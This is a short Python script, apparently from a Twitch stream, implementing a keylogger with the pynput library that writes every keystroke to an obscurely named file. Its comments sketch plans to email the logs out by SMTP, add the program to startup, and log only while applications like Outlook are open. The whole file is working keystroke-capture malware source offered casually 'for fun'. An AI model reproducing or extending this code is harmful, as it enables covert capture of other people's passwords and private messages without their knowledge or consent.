#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""key logger for fun and play
   Twitch 
   shoutouts to mehfuz for donating 500
   2 gift subs from p0z0x
"""
# use smtp send email to us
# attach this application to startup
# look for application title such as Outlook to only log during that time
# requires https://pypi.org/project/pynput/


import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def press(key):
    """
    what key did the user press
    """
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 0:
        count = 0
        write(keys)
        keys = []


def write(keys):
    """
    log output to a file for future use
    """
    with open('awedioasd.asd', 'a+') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
  

def release(key):
    """
    stops the program, in reality you probably wouldn't do this
    """
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
